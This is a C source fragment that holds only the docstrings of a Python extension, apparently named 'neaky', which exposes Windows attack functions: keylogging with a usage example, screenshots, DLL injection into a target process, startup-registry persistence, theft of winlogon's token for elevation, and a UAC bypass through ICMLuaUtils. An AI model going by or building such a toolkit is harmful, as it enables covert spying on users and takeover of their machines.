#define PY_SSIZE_T_CLEAN
#include <Python.h>

PyDoc_STRVAR(
    keylog_to_file_doc,
    "keylog_to_file(path: str, /)\n"
    "--\n"
    "\n"
    "Start keylogging into a file specified by (path: str).\n"
    "example: \n"
    "```python\n\
    import neaky,time,threading\n\
    def end_log():\n\
        time.sleep(7)\n\
        neaky.keylog_to_file_stop()\n\
    neaky.keylog_to_file(r'C:\\Users\\warren\\Desktop\\a.txt')\n\
    t = threading.Thread(target=end_log)\n\
    t.start()\n\
    neaky.message_loop()\n\
```");

PyDoc_STRVAR(
    screenshot_doc,
    "screenshot(path: str, /)\n"
    "--\n"
    "\n"
    "Save screenshot to path specified by (path: str).");

PyDoc_STRVAR(
    get_pid_by_name_doc,
    "get_pid_by_name(name: str, /)\n"
    "--\n"
    "\n"
    "Return the first process's pid that matches (name: str, /) (using wcsicmp) (from start, allow partial match, "
    "case insensetive).");

PyDoc_STRVAR(
    get_pids_by_name_doc,
    "get_pids_by_name(name: str, /)\n"
    "--\n"
    "\n"
    "Return a list of processes's pid that matches (name: str, /) (using wcsicmp) (from start, allow partial match, "
    "case insensetive).\n\n"
    ":returns: list\n");

PyDoc_STRVAR(
    remote_thread_injection_doc,
    "remote_thread_injection(dll_path: str, pid: int, /)\n"
    "--\n"
    "\n"
    "Inject dll to target process specified by pid. (dll_path: str, pid: int, /)\n"
    "\n"
    ":param dll_path: the path to dll file to be injected\n\n"
    ":param pid: target process's pid");

PyDoc_STRVAR(
    set_startup_reg_doc,
    "set_startup_reg(key: str, path: str, /)\n"
    "--\n"
    "\n"
    "Set an entry in startup registry for the executable specified by path. (key: str, path: str, /)");

PyDoc_STRVAR(
    delete_startup_reg_doc,
    "delete_startup_reg(key: str, /)\n"
    "--\n"
    "\n"
    "Delete an entry specified by (key: str, /) in startup registry");

PyDoc_STRVAR(
    get_username_doc,
    "get_username()\n"
    "--\n"
    "\n"
    "return the user name of current thread's token.");

PyDoc_STRVAR(
    elevate_thread_doc,
    "elevate_thread(pid: int, /)\n"
    "--\n"
    "\n"
    "Steal process specified by (pid: int, /) 's credential and use for current thread.\n"
    "if no arg is specified, it targets at winlogon.exe.");

PyDoc_STRVAR(
    elevate_execute_doc,
    "elevate_execute(program_path: str, cmd: str, pid: int = 0, /)\n"
    "--\n"
    "\n"
    "Steal pid's credential and execute specified program. (program_path: str, cmd: str, pid: int = 0, /)\n"
    "if no arg is specified, it targets at winlogon.exe.\n"
    "program_path can be omitted and included in cmd");

PyDoc_STRVAR(
    bypass_uac_exec_doc,
    "bypass_uac_exec(program_path: str, cmd: str, /)\n"
    "--\n"
    "\n"
    "Bypass UAC via ICMLuaUtils COM interface. (program_path: str, cmd: str, /)\n"
    "To actually bypass UAC, it's required that caller and target are both Microsoft signed.\n"
    "program_path can be omitted and included in cmd");
